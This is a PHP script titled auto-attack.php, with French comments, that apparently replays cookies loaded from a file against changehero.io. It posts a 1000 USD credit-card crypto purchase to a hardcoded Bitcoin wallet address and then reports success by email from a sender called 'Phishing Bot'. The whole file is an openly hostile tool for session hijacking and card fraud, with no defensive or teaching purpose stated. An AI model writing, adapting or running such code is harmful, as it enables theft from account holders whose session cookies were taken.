<?php
// auto-attack.php

// Log de début d'exécution
file_put_contents('attack.log', "Début de l'exécution du script auto-attack.php\n", FILE_APPEND);

// Inclure les classes PHPMailer
require 'phpmailer/PHPMailer.php';
require 'phpmailer/SMTP.php';
require_once 'phpmailer/Exception.php'; // Utilisation de require_once pour éviter les erreurs de compilation

// Log d'inclusion des classes PHPMailer
file_put_contents('attack.log', "Classes PHPMailer incluses\n", FILE_APPEND);

// Charger les variables d'environnement
$env = parse_ini_file('.env', true);

// Log de chargement des variables d'environnement
file_put_contents('attack.log', "Variables d'environnement chargées\n", FILE_APPEND);

// Charger les cookies depuis le fichier
$cookies = file_get_contents('cookies.txt');

// Log de chargement des cookies
file_put_contents('attack.log', "Cookies chargés\n", FILE_APPEND);

// Utiliser cURL pour se connecter à changehero.io
$ch = curl_init();

// Log de début de la requête
file_put_contents('attack.log', "Début de la requête vers changehero.io\n", FILE_APPEND);

curl_setopt($ch, CURLOPT_URL, 'https://changehero.io/buy-sell-transaction/buy');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIE, $cookies);

$response = curl_exec($ch);

// Log de fin de la requête
file_put_contents('attack.log', "Fin de la requête vers changehero.io\n", FILE_APPEND);

if ($response === false) {
    file_put_contents('attack.log', "Erreur de connexion : " . curl_error($ch) . "\n", FILE_APPEND);
    die('Erreur de connexion : ' . curl_error($ch));
}

// Log de début de la transaction
file_put_contents('attack.log', "Début de la transaction\n", FILE_APPEND);

// Exemple : acheter 1000 USD en crypto
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'amount' => '1000',
    'currency' => 'USD',
    'payment_method' => 'credit_card',
    'destination' => 'bc1qu5njfcsr4pygu5ujggry65f98rmcyu9hc6qn6z' // Wasabi wallet address
]));

$transaction_result = curl_exec($ch);

// Log de fin de la transaction
file_put_contents('attack.log', "Fin de la transaction\n", FILE_APPEND);

if ($transaction_result === false) {
    file_put_contents('attack.log', "Erreur lors de la transaction : " . curl_error($ch) . "\n", FILE_APPEND);
    die('Erreur lors de la transaction : ' . curl_error($ch));
}

// Log de début de l'envoi d'e-mail
file_put_contents('attack.log', "Début de l'envoi d'e-mail\n", FILE_APPEND);

// Envoi d'un e-mail si la transaction est réussie
$mail = new PHPMailer\PHPMailer\PHPMailer();
$mail->isSMTP();
$mail->Host = $env['SMTP_HOST'];
$mail->SMTPAuth = true;
$mail->Username = $env['SMTP_USER'];
$mail->Password = $env['SMTP_PASS'];
$mail->SMTPSecure = $env['SMTP_SECURE'];
$mail->Port = $env['SMTP_PORT'];

$mail->setFrom($env['SMTP_USER'], 'Phishing Bot');
$mail->addAddress('votre_email@example.com', 'Admin');

$mail->isHTML(false);
$mail->Subject = 'Transaction réussie';
$mail->Body = "Transaction réussie sur changehero.io\n\n" . $transaction_result;

if (!$mail->send()) {
    file_put_contents('attack.log', "E-mail non envoyé. Erreur : " . $mail->ErrorInfo . "\n", FILE_APPEND);
    echo "E-mail non envoyé. Erreur : " . $mail->ErrorInfo;
} else {
    file_put_contents('attack.log', "E-mail envoyé avec succès\n", FILE_APPEND);
    echo "Transaction réussie et e-mail envoyé !";
}

curl_close($ch);
